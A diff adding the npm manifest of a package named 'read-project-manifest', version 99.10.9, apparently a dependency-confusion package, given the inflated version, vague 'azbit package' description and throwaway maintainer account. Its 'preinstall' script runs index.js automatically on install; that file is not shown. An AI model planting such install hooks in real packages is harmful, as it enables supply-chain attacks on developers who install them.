@@ -1,0 +1,39 @@
+{
+    "name": "read-project-manifest",
+    "version": "99.10.9",
+    "description": "azbit package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo 'error no test specified' && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "read-project-manifest@99.10.9",
+    "_nodeVersion": "16.14.2",
+    "_npmVersion": "8.5.0",
+    "dist": {
+        "integrity": "sha512-C1XXFS1YBxwJVBSjbf0QaIeVbLS3VuYhYcRks1B7lR5a3nw3bz0s3OHATFpcRMfIbhQHwpL31+O6hSYhHotn2w==",
+        "shasum": "9cc0bd9e8bafbc9a99439f73f4239ef378c2d5a6",
+        "tarball": "https://registry.npmjs.org/read-project-manifest/-/read-project-manifest-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 5073,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiPMOJACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2Vmp+iw/+MLfxdCKwXQmagl9pjc3XUg/StgND+yA/idb5t4yeHYf4TFkQ\r\nMRh2yCl99TYN4JfN5tXqI8GkY6DtAFrPr0cDUV1zMtJoewz5olMYsyvKYjQE\r\nah+5iimNseo6WVeLnbDioHZQVgAqktYxZ19pM/1ROWepkO+Ob40swvBvSTxG\r\nDUafedlqStqdGapsphMiLKD9u/eHySoONvf8Dr9aN1e8IpK17AUrPDbNH+Wp\r\nOKx2KnOOiWcAjsBr687pV3NB0q+eYYvkL/jvnVvbvZ4Q5onOPqOUNkf8V7Oz\r\nyatIenB/s+wVryEjzOs4v9t+eYKQ5oEJLD7j//bvZ+HT0SdUDfeyBjbztaLH\r\nO2aIRKKoM+5ryfxH+xR9C7BTWPOHM4mZ45DHK8/o1LASpa2AB1VRj24BjmBA\r\nQh/83+F0V/96KocQEzDZflNFxmnQkiiq601gZwHS7FikPQdDDhLBfROr3kIq\r\nKzQUs2VleEIEhiEoHq7CRjj3ndd3nVymdvTO6O+kj3AhdBDRM+6ISoRfb0mS\r\nZds4wcPlfzeikDFPROBQX8lTXgfn3kApX5Qr8xRjYJEl98VgPk7YpphKCgY5\r\nW8zvjAG2vg5IshkdjsqG//hmMzcEMIbmhxPHoCUzBEyWkqqRB5OPCA0/XxUl\r\ns7Wz96hMka/HNe00xq5NO/248wdCdxmmF4s=\r\n=gxXX\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "izn4o8g4",
+        "email": "izn4o8g4@rt11.ml"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "izn4o8g4",
+            "email": "izn4o8g4@rt11.ml"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/read-project-manifest_99.10.9_1648149385056_0.17980377353578492"
+    },
+    "_hasShrinkwrap": false
+}
